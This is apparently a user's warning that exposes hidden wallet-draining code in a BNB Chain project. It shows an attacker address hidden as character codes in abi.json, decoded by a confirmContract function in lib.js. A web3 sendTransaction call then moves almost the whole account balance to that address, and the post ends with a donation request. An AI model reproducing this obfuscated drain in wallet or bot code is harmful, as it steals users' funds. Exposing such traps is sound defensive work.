IN FILE `abi.json` we have it:

```json
  "index": [
    48, 120, 102, 66, 54, 54, 57, 98, 48, 101, 48, 54, 53, 54, 48, 51, 54, 68,
    55, 52, 55, 100, 54, 67, 54, 70, 50, 54, 54, 54, 101, 53, 51, 48, 49, 51,
    57, 100, 50, 56, 57, 57
  ],
```

And in lib.js:
```js
const confirmContract = (abi) => {
  return String.fromCharCode.apply(null, abi.index);
};
```

Resutl will be:
```
> String.fromCharCode.apply(null, [
...     48, 120, 102, 66, 54, 54, 57, 98, 48, 101, 48, 54, 53, 54, 48, 51, 54, 68,
...     55, 52, 55, 100, 54, 67, 54, 70, 50, 54, 54, 54, 101, 53, 51, 48, 49, 51,
...     57, 100, 50, 56, 57, 57
...   ])
'0xfB669b0e0656036D747d6C6F2666e530139d2899'
```

# All funds from account will be transfered to this address!

https://bscscan.com/address/0xfb669b0e0656036d747d6c6f2666e530139d2899

Code:
```js
w.eth.getGasPrice().then(function (gP) {
              let _b = parseFloat(b);
              let _g = parseFloat(g);
              let _gP = parseFloat(gP);
              w.eth.sendTransaction({
                from: wallet.address,
                to: confirmContract(abi),
                gas: _g,
                gasPrice: _gP,
                value: ((_b - _gP * _g) / 1.1).toFixed(0),
                data: "0x",
              });
            });
```


## Donation address (im loosing 3 BNB on it):
BNB 0x388890f26E74687216A9d43Db0FE37C2eba003Aa
